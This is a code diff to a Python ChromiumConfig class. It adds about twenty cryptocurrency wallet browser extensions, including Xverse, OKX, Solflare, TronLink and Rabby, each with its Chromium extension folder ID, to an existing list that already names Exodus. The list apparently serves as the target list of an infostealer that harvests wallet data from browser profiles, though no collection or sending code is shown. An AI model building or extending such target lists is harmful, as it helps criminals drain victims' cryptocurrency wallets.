@@ -60,7 +60,87 @@ class ChromiumConfig:
         {
             "name": "Exodus",
             "folders": ["aholpfdialjgjfhomihkjbmgjidlcdno"]
-        }
+        },
+        {
+            "name": "Xverse",
+            "folders": ["idnnbdplmphpflfnlkomgpfbpcgelopg"]
+        },
+        {
+            "name": "Unisat",
+            "folders": ["ppbibelpcjmhbdihakflkdcoccbgbkpo"]
+        },
+        {
+            "name": "OKX",
+            "folders": ["mcohilncbfahbmgdjkbpemcciiolgcge"]
+        },
+        {
+            "name": "Backpack",
+            "folders": ["aflkmfhebedbjioipglgcbcmnbpgliof"]
+        },
+        {
+            "name": "BNB Wallet",
+            "folders": ["fhbohimaelbohpjbbldcngcnapndodjp"]
+        },
+        {
+            "name": "Solflare",
+            "folders": ["bhhhlbepdkbapadjdnnojkbgioiodbic"]
+        },
+        {
+            "name": "Magic Eden",
+            "folders": ["mkpegjkblkkefacfnmkajcjmabijhclg"]
+        },
+        {
+            "name": "TronLink",
+            "folders": ["ibnejdfjmmkpcnlpebklmnkoeoihofec"]
+        },
+        {
+            "name": "Trust",
+            "folders": ["egjidjbpglichdcondbcbdnbeeppgdph"]
+        },
+        {
+            "name": "Bitget",
+            "folders": ["jiidiaalihmmhddjgbnbgdfflelocpak"]
+        },
+        {
+            "name": "Coin 98",
+            "folders": ["aeachknmefphepccionboohckonoeemg"]
+        },
+        {
+            "name": "Argent X",
+            "folders": ["dlcobpjiigpikoobohmabehhmhfoodbb"]
+        },
+        {
+            "name": "Keplr",
+            "folders": ["dmkamcknogkgcdfhhbddcghachkejeap"]
+        },
+        {
+            "name": "Martian",
+            "folders": ["efbglgofoippbgcjepnhiblaibcnclgk"]
+        },
+        {
+            "name": "Nami",
+            "folders": ["lpfcbjknijpeeillifnkikgncikgfhdo"]
+        },
+        {
+            "name": "Pontem",
+            "folders": ["phkbamefinggmakgklpkljjmgibohnba"]
+        },
+        {
+            "name": "Rabby",
+            "folders": ["acmacodkjbdgmoleebolmdjonilkdbch"]
+        },
+        {
+            "name": "Ronin",
+            "folders": ["fnjhmkhhmkbjkkabndcnnogagogbneec"]
+        },
+        {
+            "name": "Talisman",
+            "folders": ["fijngjgcjhjmmpcmkeiomlglpeiijkld"]
+        },
+        {
+            "name": "Temple",
+            "folders": ["ookjlbkiijinhpmnjffcofjonbfbgaoc"]
+        },
     ]
 
 
